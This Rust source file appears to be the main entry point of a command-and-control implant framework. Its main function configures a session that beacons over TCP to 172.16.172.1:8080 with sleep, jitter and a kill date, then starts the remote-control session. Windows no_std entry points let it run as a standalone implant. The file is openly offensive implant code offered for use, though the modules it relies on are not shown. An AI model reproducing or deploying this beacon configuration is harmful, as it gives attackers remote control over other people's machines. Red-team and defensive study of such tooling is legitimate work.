// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

// Initial Attributes
// ==============================
#![no_main]
#![no_implicit_prelude]
// ==============================
// Nightly Arguments
// ==============================
#![allow(internal_features)]
// ==============================
// Required Features
// ==============================
#![feature(
    cfg_match,
    extract_if,
    trait_alias,
    prelude_2024,
    allocator_api,
    fmt_internals,
    error_in_core,
    const_mut_refs,
    core_intrinsics,
    btree_extract_if,
    alloc_layout_extra,
    vec_into_raw_parts,
    slice_index_methods,
    const_intrinsic_copy,
    pointer_is_aligned_to
)]
// ==============================
// Setup for no_std on Windows
// ==============================
#![cfg_attr(
    any(not(target_family = "windows"), feature = "std"),
    feature(can_vector, io_error_more, seek_stream_len, io_error_uncategorized)
)]
// ==============================
// Setup for std on Windows
// ==============================
#![cfg_attr(all(target_family = "windows", feature = "std"), feature(iter_collect_into))]
// ==============================
// Add additional features used
// for stx.
// ==============================
#![cfg_attr(
    all(target_family = "windows", not(feature = "std")),
    no_std,
    feature(
        start,
        lang_items,
        new_uninit,
        ptr_as_uninit,
        naked_functions,
        iter_collect_into,
        maybe_uninit_slice,
        panic_info_message,
        maybe_uninit_write_slice
    )
)]

// We'll enable these later :P
//#![windows_subsystem = "console"]
//#![windows_subsystem = "windows"]

pub mod c2;
pub mod com;
pub mod data;
pub mod device;
pub mod env;
#[path = "compat/ffi.rs"]
pub mod ffi;
pub mod fs;
#[path = "compat/io.rs"]
pub mod io;
pub mod net;
#[path = "compat/path.rs"]
pub mod path;
#[path = "compat/prelude.rs"]
pub mod prelude;
pub mod process;
pub mod sync;
pub mod thread;
pub mod time;
pub mod util;

use core::time::Duration;

use crate::c2::cfg::OwnedConfig;
use crate::c2::Session;
use crate::data::memory::Manager;
use crate::data::time::Time;
use crate::prelude::*;
use crate::util::log::{console, Level, Log};

fn main_inner() -> i32 {
    let mm = Manager::new();
    {
        println!("Hello!");
        let v = OwnedConfig::new_in(mm.silo())
            .host("172.16.172.1:8080")
            .connect_tcp()
            .sleep(Duration::from_secs(10))
            .jitter(10)
            .kill_date(Time::new(2024, data::time::Month::December, 10, 13, 0, 0))
            .try_into()
            .unwrap();

        println!("ready?");

        Session::new_in(
            Log::new(Level::Trace, None, console()),
            v,
            Some(&mm),
            mm.silo(),
        )
        .unwrap()
        .start(Some(Duration::from_secs(5)), None)
        .unwrap();
    }
    println!("done?");

    0
}

#[cfg(all(windows, not(feature = "std")))]
#[global_allocator]
static GLOBAL: crate::device::winapi::HeapAllocator = crate::device::winapi::HeapAllocator::new();

#[cfg(any(unix, feature = "std"))]
#[inline]
#[no_mangle]
fn main() {
    crate::process::exit(main_inner())
}

#[cfg(all(windows, not(feature = "std")))]
#[inline]
#[no_mangle]
extern "C" fn _main() {
    let r = main_inner();
    crate::device::winapi::unload_libraries();
    crate::process::exit(r)
}

#[cfg(not(test))]
#[cfg(all(windows, not(feature = "std")))]
#[allow(unused_variables)]
#[panic_handler]
fn panic(p: &core::panic::PanicInfo<'_>) -> ! {
    #[cfg(not(feature = "strip"))]
    {
        println!("=========== [PANIC] ===========");
        if let Some(p) = p.payload().downcast_ref::<&str>() {
            println!("{}", p);
        }
        if let Some(m) = p.message() {
            println!("{}", m.to_string());
        }
        if let Some(l) = p.location() {
            println!("{}:{}", l.file(), l.line());
        }
        println!("========= [END PANIC] =========");
    }
    crate::device::winapi::unload_libraries();
    crate::process::exit(255)
}

#[cfg(all(windows, not(feature = "std")))]
#[inline]
#[no_mangle]
extern "C" fn WinMain(_h: usize, _z: usize, _a: usize, _s: u32) -> i32 {
    let r = main_inner();
    crate::device::winapi::unload_libraries();
    r
}
